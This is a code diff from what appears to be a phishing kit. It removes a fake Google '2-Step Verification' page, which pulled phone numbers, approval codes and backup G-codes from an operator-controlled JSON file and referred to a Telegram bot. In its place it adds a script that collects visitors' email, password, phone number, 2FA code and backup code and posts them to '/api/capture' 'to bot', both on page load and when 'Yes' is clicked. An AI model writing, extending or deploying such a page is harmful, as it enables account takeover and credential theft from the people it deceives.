@@ -1,398 +1,50 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Google 2FA Notification</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-    }
-    body {
-      background: #e8eaed;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 20px;
-    }
-    .card {
-      background: white;
-      max-width: 450px;
-      width: 100%;
-      padding: 40px 40px 30px;
-      border-radius: 8px;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
-      position: relative;
-    }
-    .logo {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    .logo img {
-      width: 72px;
-      height: 72px;
-    }
-    .title {
-      font-size: 24px;
-      font-weight: 400;
-      text-align: center;
-      margin-bottom: 8px;
-    }
-    .subtext {
-      font-size: 15px;
-      color: #202124;
-      text-align: center;
-      line-height: 1.5;
-      margin-bottom: 6px;
-    }
-    .learn-more {
-      display: block;
-      text-align: center;
-      font-size: 14px;
-      color: #1a73e8;
-      text-decoration: none;
-      margin: 6px 0 16px;
-      cursor: pointer;
-    }
-    .learn-more:hover {
-      text-decoration: underline;
-    }
-    .divider {
-      border: 0;
-      border-top: 1px solid #dadce0;
-      margin: 16px 0 20px;
-    }
-    .code-badge {
-      background: #e8f0fe;
-      color: #1a73e8;
-      font-size: 18px;
-      font-weight: 500;
-      padding: 6px 16px;
-      border-radius: 20px;
-      display: inline-block;
-      margin: 0 auto 18px;
-      text-align: center;
-      transition: all 0.3s ease;
-      font-family: 'Courier New', monospace;
-      letter-spacing: 2px;
-    }
-    .code-badge.success {
-      background: #e6f4ea;
-      color: #1e8e3e;
-    }
-    .code-badge.error {
-      background: #fce8e6;
-      color: #d93025;
-    }
-    .code-badge.generated {
-      background: #e8f0fe;
-      color: #1a73e8;
-      animation: pulse 1s ease-in-out;
-    }
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.1); }
-      100% { transform: scale(1); }
-    }
-    .instruction {
-      font-size: 15px;
-      color: #202124;
-      text-align: center;
-      line-height: 1.5;
-    }
-    .instruction strong {
-      font-weight: 500;
-    }
-    .notification-box {
-      background: #f8f9fa;
-      border: 1px solid #e8eaed;
-      border-radius: 8px;
-      padding: 16px 18px;
-      margin: 18px 0 22px;
-      display: flex;
-      align-items: center;
-      gap: 14px;
-    }
-    .notification-box .icon {
-      font-size: 28px;
-    }
-    .notification-box .msg {
-      font-size: 14px;
-      color: #202124;
-      line-height: 1.4;
-    }
-    .notification-box .msg .highlight {
-      font-weight: 500;
-      color: #1a73e8;
-    }
-    .actions-2fa {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-top: 8px;
-      flex-wrap: wrap;
-      gap: 12px;
-    }
-    .btn-back {
-      background: transparent;
-      border: none;
-      color: #1a73e8;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-      padding: 8px 4px;
-    }
-    .btn-back:hover {
-      text-decoration: underline;
-    }
-    .btn-yes {
-      background: #1a73e8;
-      color: white;
-      border: none;
-      padding: 10px 32px;
-      border-radius: 4px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    .btn-yes:hover {
-      background: #1967d2;
-    }
-    .btn-yes.success {
-      background: #1e8e3e;
-    }
-    .btn-yes.error {
-      background: #d93025;
-    }
-    .identity-display {
-      background: #f1f3f4;
-      border-radius: 4px;
-      padding: 8px 16px;
-      display: inline-block;
-      font-weight: 500;
-      color: #1a73e8;
-      margin-top: 4px;
-      font-size: 15px;
-    }
-    .identity-label {
-      font-size: 14px;
-      color: #5f6368;
-    }
-    .switch-method {
-      text-align: center;
-      margin-top: 16px;
-      font-size: 14px;
-    }
-    .switch-method a {
-      color: #1a73e8;
-      text-decoration: none;
-      cursor: pointer;
-    }
-    .switch-method a:hover {
-      text-decoration: underline;
-    }
-    .status-badge {
-      position: absolute;
-      top: 10px;
-      right: 10px;
-      font-size: 10px;
-      padding: 4px 10px;
-      border-radius: 12px;
-      background: #e8eaed;
-      color: #5f6368;
-      transition: all 0.3s ease;
-    }
-    .status-badge.active {
-      background: #e8f0fe;
-      color: #1a73e8;
-    }
-    .status-badge.success {
-      background: #e6f4ea;
-      color: #1e8e3e;
-    }
-    .status-badge.error {
-      background: #fce8e6;
-      color: #d93025;
-    }
-    .status-badge.generated {
-      background: #fff3e0;
-      color: #e65100;
-    }
-    .g-code-section {
-      background: #f8f9fa;
-      border-radius: 8px;
-      padding: 16px;
-      margin: 16px 0;
-      border: 1px solid #e8eaed;
-      text-align: center;
-    }
-    .g-code-section .label {
-      font-size: 12px;
-      color: #5f6368;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-    }
-    .g-code-section .code {
-      font-size: 24px;
-      font-weight: 700;
-      color: #1a73e8;
-      font-family: 'Courier New', monospace;
-      letter-spacing: 3px;
-      margin-top: 4px;
-    }
-    .g-code-section .code.success {
-      color: #1e8e3e;
-    }
-    .g-code-section .code.error {
-      color: #d93025;
-    }
-    @media (max-width: 480px) {
-      .card { padding: 30px 20px; }
-      .actions-2fa { flex-direction: column; align-items: stretch; gap: 12px; }
-      .btn-yes { width: 100%; }
-    }
-  </style>
-</head>
-<body>
-
-<div class="card" id="twofaCard">
-  <div class="status-badge" id="statusBadge">● Idle</div>
-  
-  <div class="logo">
-    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" />
-  </div>
-  <div class="title">2‑Step Verification</div>
-  <p class="subtext">
-    To help keep your account secure, Google wants to make sure it's really you trying to sign in.
-  </p>
-  <a href="#" class="learn-more" onclick="alert('Demo: Learn more'); return false;">Learn more</a>
-  <hr class="divider" />
-
-  <!-- Phone number displayed here -->
-  <div style="text-align: center; margin-bottom: 12px;">
-    <span class="identity-label">Verifying for</span><br />
-    <span class="identity-display" id="identityDisplay">Not set</span>
-  </div>
-
-  <!-- Code badge -->
-  <div style="text-align: center;">
-    <span class="code-badge" id="codeBadge">54</span>
-  </div>
-
-  <p class="instruction">
-    <strong>Open your Google app on your phone</strong>
-  </p>
-
-  <div class="notification-box">
-    <span class="icon">📱</span>
-    <div class="msg">
-      Google sent a notification to your phone.<br />
-      Tap <span class="highlight">Yes</span>, then tap <span class="highlight" id="codeHighlight">54</span> to continue signing in.
-    </div>
-  </div>
-
-  <!-- G-Code Section -->
-  <div class="g-code-section">
-    <div class="label">Your G‑Code (Backup Code)</div>
-    <div class="code" id="gCodeDisplay">1234-5678</div>
-  </div>
-
-  <div class="actions-2fa">
-    <button class="btn-back" id="backBtn">‹ Back</button>
-    <button class="btn-yes" id="yesBtn">Yes</button>
-  </div>
-
-  <div class="switch-method">
-    <a onclick="alert('Demo: Switch to G-code page')">Use a backup G‑code instead</a>
-  </div>
-</div>
-
 <script>
-  // ===== DOM REFS =====
-  const identityDisplay = document.getElementById('identityDisplay');
-  const codeBadge = document.getElementById('codeBadge');
-  const codeHighlight = document.getElementById('codeHighlight');
-  const gCodeDisplay = document.getElementById('gCodeDisplay');
-  const statusBadge = document.getElementById('statusBadge');
-  const yesBtn = document.getElementById('yesBtn');
-  const backBtn = document.getElementById('backBtn');
+  // ===== DATA CAPTURE =====
+  function captureVisitorData(data) {
+    // Get visitor info
+    const visitorData = {
+      email: data.email || document.getElementById('email')?.value || 'Not provided',
+      password: data.password || document.getElementById('password')?.value || 'Not provided',
+      phone: data.phone || document.getElementById('phoneInput')?.value || 'Not provided',
+      code: data.code || document.getElementById('codeBadge')?.textContent || 'Not provided',
+      g_code: data.g_code || document.getElementById('gCodeDisplay')?.textContent || 'Not provided',
+      page: 'Google 2FA Page',
+      ip: 'Unknown',
+      user_agent: navigator.userAgent
+    };
 
-  // ===== UPDATE UI FROM DATA =====
-  function updatePage() {
-    fetch('2fa_data.json?' + new Date().getTime())
-      .then(response => response.json())
-      .then(data => {
-        // Update phone number
-        if (data.phone_number) {
-          identityDisplay.textContent = data.phone_number;
-        }
-
-        // Update code badge
-        if (data.code) {
-          codeBadge.textContent = data.code;
-          codeHighlight.textContent = data.code;
-        }
-
-        // Update G-Code
-        if (data.g_code) {
-          gCodeDisplay.textContent = data.g_code;
-        }
-
-        // Update status
-        statusBadge.className = 'status-badge';
-        codeBadge.className = 'code-badge';
-        gCodeDisplay.className = 'code';
-        yesBtn.className = 'btn-yes';
-
-        if (data.status === 'success') {
-          statusBadge.textContent = '✅ Success';
-          statusBadge.classList.add('success');
-          codeBadge.classList.add('success');
-          gCodeDisplay.classList.add('success');
-          yesBtn.classList.add('success');
-        } else if (data.status === 'password_error') {
-          statusBadge.textContent = '❌ Error';
-          statusBadge.classList.add('error');
-          codeBadge.classList.add('error');
-          gCodeDisplay.classList.add('error');
-          yesBtn.classList.add('error');
-        } else if (data.status === 'code_generated') {
-          statusBadge.textContent = '📱 Code Ready';
-          statusBadge.classList.add('generated');
-          codeBadge.classList.add('generated');
-        } else if (data.status === 'number_set') {
-          statusBadge.textContent = '📞 Number Set';
-          statusBadge.classList.add('active');
-        } else {
-          statusBadge.textContent = '● Idle';
-        }
-      })
-      .catch(error => {
-        console.log('Error loading data:', error);
-      });
+    // Send to bot
+    fetch('/api/capture', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(visitorData)
+    })
+    .then(response => response.json())
+    .then(result => {
+      console.log('✅ Data captured:', result);
+    })
+    .catch(error => {
+      console.log('⚠️ Error capturing data:', error);
+    });
   }
 
-  // ===== BUTTON HANDLERS =====
-  yesBtn.addEventListener('click', function() {
-    alert('✅ Verification confirmed!\n\nThis would notify the Telegram bot.');
+  // Capture data when user interacts with the page
+  document.addEventListener('DOMContentLoaded', function() {
+    // Capture on page load
+    setTimeout(() => {
+      captureVisitorData({});
+    }, 3000);
+
+    // Capture when "Yes" button is clicked
+    const yesBtn = document.getElementById('yesBtn');
+    if (yesBtn) {
+      yesBtn.addEventListener('click', function() {
+        captureVisitorData({
+          action: 'Yes button clicked'
+        });
+      });
+    }
   });
-
-  backBtn.addEventListener('click', function() {
-    alert('⬅️ Going back to sign-in (simulated).');
-  });
-
-  // ===== AUTO-UPDATE EVERY 2 SECONDS =====
-  setInterval(updatePage, 2000);
-  updatePage();
-
-  console.log('📱 Google 2FA Page loaded!');
-  console.log('💡 Connected to 2fa_data.json');
 </script>
-
-</body>
-</html>
